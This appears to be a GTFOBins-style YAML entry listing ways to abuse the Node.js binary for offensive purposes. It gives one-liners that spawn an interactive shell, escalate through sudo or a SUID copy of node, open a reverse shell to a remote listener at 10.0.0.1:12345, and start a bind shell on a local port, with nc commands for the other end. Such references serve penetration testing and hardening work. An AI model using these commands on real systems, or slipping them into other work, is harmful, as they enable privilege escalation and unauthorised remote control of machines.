---
functions:
  exec-interactive:
    - code: |
        node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
  sudo-enabled:
    - code: |
        sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
  suid-enabled:
    - code: |
        ./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'
  reverse-shell:
    - description: Run `nc -l -p 12345` to receive the shell on the other end.
      code: |
        export RHOST=10.0.0.1
        export RPORT=12345
        node -e 'sh = require("child_process").spawn("/bin/sh");
        net.connect(process.env.RPORT, process.env.RHOST, function () {
          this.pipe(sh.stdin);
          sh.stdout.pipe(this);
          sh.stderr.pipe(this);
        });'
  bind-shell:
    - description: Run `nc 10.0.0.1 12345` to connect to the shell on the other end.
      code: |
        export LPORT=12345
        node -e 'sh = require("child_process").spawn("/bin/sh");
        require("net").createServer(function (client) {
          client.pipe(sh.stdin);
          sh.stdout.pipe(client);
          sh.stderr.pipe(client);
        }).listen(process.env.LPORT);'
---
